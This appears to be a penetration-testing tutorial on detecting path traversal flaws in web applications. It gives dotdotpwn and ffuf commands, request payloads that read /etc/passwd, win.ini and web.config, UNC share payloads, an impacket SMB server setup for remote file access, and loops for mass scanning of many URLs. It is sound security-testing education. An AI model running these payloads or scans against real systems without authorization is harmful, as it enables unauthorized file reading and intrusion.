Application Security Testing for the Path Traversal vulnerabilities.

INTRODUCTION

The article describes how to test the application to find Path Traversal vulnerabilities. The advice in this article is based on the following:

  • OWASP Web Security Testing Guide
  • OWASP Application Security Verification Standard
  • Bug bounty reports
  • Own experience.

TOOLING

Tools with basic usage & wordlist used for Path Traversal detection.

STANDALONE TOOLS

  • DotDotPwn — automated Path Traversal detection for GET requests.

It is a very simple and outdated tool, yet powerful for massive scope.
For a single target would rather go with Burp Suite Intruder.

# SINGLE URL
echo | perl dotdotpwn.pl -m 'http-url' -u 'https://afine.com/TRAVERSAL' -k 'root:' -f '/etc/passwd' -q
# MULTIPLE URLS
for url in $(cat urls.txt)
do
    echo "[*] TESTING - $url" | tee -a PathTraversal.txt
    echo | perl dotdotpwn.pl -m 'http-url' -u '$url/TRAVERSAL' -k 'root:' -f '/etc/passwd' -q
done
  • ffuf — web fuzzer written in GO.

Since there are no automatic standalone tools for detecting Path Traversal beside the outdated DotDotPwn, I always go for ffuf with my own wordlist and the unofficial extension for Burp Suite — Copy As FFUF.

# SINGLE URL + MATCHER (root:)
ffuf -u 'https://afine.com/FUZZ' -mr 'root:' -w "path_traversal.txt"
# FROM A FILE + MATCHER (root:)
ffuf -request "request.txt" -mr 'root:' -w "path_traversal.txt"
  • Nessus & Burp Suite Professional automatic scanners.

I have described how to use above automatic scanners in another article:

Always double check the final command with proxy -x http://127.0.0.1:8080 .

WORDLISTS

If you identify the underlying OS, you can speed up the tests using the wordlist only for NIX or Windows.

On the other hand, some third parties may be involved in parsing your payloads, which could be using a different OS than your target application. If you have time, always choose the biggest wordlist.

  • Windows — wordlist with Windows\win.ini file in the path.
# WINDOWS -> C:\Windows\win.ini
-mr '; for 16-bit app support'
  • TRAVERSAL_IIS — wordlist with web.config file in the path.
# IIS Server -> web.config
-mr '<system.web>'
  • NIX — wordlist with /etc/passwd file in the path.
# NIX -> /etc/passwd
-mr 'root:'
  • TRAVERSAL_DIR_ONLY — wordlist without filename in the path.
  • LFI — for testing the absolute path traversal.
  • TRAVERSAL — all-in-one wordlist (around 11 000 payloads).

Path Traversal can be detected in any section of the HTTP request. However, it is commonly seen in scripts that accept filenames as parameters.

I. RELATIVE PATH TRAVERSAL — DIRECTORY LISTENING

Check for the directory listening using TRAVERSAL_DIR_ONLY.

  • Enumerate file system directories and sometimes even write to them.
  • Determine if a specified file system directory exists by analysing server response content and time difference.
# EXAMPLE REQUESTS TO ENUMERATE THE DIRECTORIES
GET /search?query=../../../../../etc/ HTTP/1.1
GET /search?query=../../../../../../ HTTP/1.1

Sometimes you will not achieve the typical file read|overwrite. Instead, you could check for the existence of the directories, list them or even write files to them.

II. RELATIVE PATH TRAVERSAL — READ|WRITE

Check for the file read using NIX|Windows wordlists.

  • Read files from the filesystem.
  • Write files outside the restricted area.
# EXAMPLE REQUESTS TO READ THE FILES
GET /search?query=../../../../../etc/passwd HTTP/1.1
GET /search?query=../../../../../Windows/win.ini HTTP/1.1

If you know the web server, try to read the files in the web root. One such wordlist could be TRAVERSAL_IIS which targets the web.config file. It is more likely the process in the context you are injecting has read access to the web root folder than to the filesystem.

III. ABSOLUTE PATH TRAVERSAL

Use the LFI wordlist to check if you can read files using a direct path.

  • Read files from the filesystem using their full and absolute path.
# EXAMPLE REQUESTS TO READ FILES
GET /search?query=/etc/passwd HTTP/1.1
GET /search?query=C:\\Windows\\win.ini HTTP/1.1

In another AppSec Tale, I will explain Local File Inclusions detailedly.

IV. UNC SHARE TRAVERSAL

Specify arbitrary paths in the UNC format.

  • The I-III scenarios could happen with the UNC share.
  • Use the \\localhost\c$\windows\win.ini, which would work if the SMB share functions locally on the server that hosts the target application.
# EXAMPLE PAYLOADS TO READ FILES LOCALLY USING UNC PATH
\\127.0.0.1\c$\windows\win.ini
\\\\127.0.0.1\\c$\windows\\win.ini
//127.0.0.1/c$/windows/win.ini
\\localhost\c$\windows\win.ini
\\\\localhost\\c$\\windows\\win.ini
//localhost/c$/windows/win.ini
  • You can also spin up your private SMB server using impacket:
impacket-smbserver -smb2support sharename /Users/karmaz/share/
  • Then use your VPS public IP address to access it:
# EXAMPLE REQUEST TO READ FILES REMOTELY
GET /search?query=\\123.123.123.123\sharename HTTP/1.1

The example with the remote SMB server is more like a Remote File Inclusion style (which will be thoroughly explained in another AppSec Tale).

Use TRAVERSAL to conduct tests with payloads mentioned in points I-IV using a single wordlist.

V. SECOND-ORDER PATH TRAVERSAL

Repeat the above steps for any input parsed elsewhere.

  • In the AppSec Tales XIII, you can find point IX. SECOND-ORDER SQLI describes the example scenario and shows the possibility of automation of second-order vulnerabilities using a Python middleware server.

VI. BOMB TESTING

If there is no length limit of the input, use all of the payloads at once.

  • Copy-paste all of your payloads and check the results.
  • Additionally, you can add some “A” chars if there is no change in the server response after copy-paste all of the payloads.

This method can trigger another error, changing the context and making application vulnerable to Path Traversal.

VII. MASS TESTING

When you have a lot of URLs to test, use CLI tools.

  • Using DotDotpwn:
for url in $(cat urls.txt)
do
    echo "[*] TESTING - $url" | tee -a PathTraversal.txt
    echo | perl dotdotpwn.pl -m 'http-url' -u '$url/TRAVERSAL' -k 'root:' -f '/etc/passwd' -q
done
  • Using ffuf:
for url in $(cat urls.txt)
do 
  echo "[*] TESTING - $url" | tee -a PathTraversal.txt
  ffuf -u "$url" -mr 'root:|; for 16-bit app support|<system.web>' -w "TRAVERSAL" -v -r | tee -a PathTraversal.txt
done

This way, you can test for low-hanging fruits on a scale.

IMPACT OF PATH TRAVERSAL

Most of the time allows to access sensitive data and files. Sometimes this data allows to execute code on the back-end server. However, it is not a direct impact of Path Traversal alone. Nevertheless, vulnerability should never be ignored.

Sometimes even reading files is not the case. I once found a strange caching mechanism in one of the WordPress plugins. Due to the Path Traversal vulnerability, a cache file was created outside the plugin folder. Which in turn leads to blind filesystem enumeration and denial of service.
